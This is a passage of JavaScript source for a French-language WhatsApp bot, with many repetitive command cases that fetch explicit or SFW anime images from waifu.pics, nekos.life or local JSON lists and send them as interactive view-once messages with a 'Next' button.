            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🍁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
            }
            break
case 'trap' :{
if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-neko' :
case 'hneko' :{
if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-waifu' :
case 'nwaifu' :{
if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'gasm':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break  
case 'milf':{
if (!m.isGroup) return KevStickGroup()
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/milf.json'))
var Kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break 
case 'animespank':{
if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'blowjob':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/blowjob.json'))
var Kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'cuckold':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/cuckold.json'))
var Kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'eba':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/eba.json'))
var Kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'pussy':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/pussy.json'))
var Kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'yuri':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/yuri.json'))
var Kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'zettai':{
if (!m.isGroup) return KevStickGroup()
	if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./recherche/media/nsfw/zettai.json'))
var Kevinouresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:Kevinouresult.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
case 'gifblowjob':{
if (!m.isGroup) return KevStickGroup()
if (!AntiNsfw) return replygckev(mess.nsfw)
await KevStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video:bogif, gifPlayback:true }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
			case 'animeawoo':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
 let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}\n_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animemegumin':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeshinobu':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehandhold':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehighfive':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecringe':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animedance':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehappy':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeglomp':{
await KevStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hey ${m.pushName}
_*Voici le resultat de ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
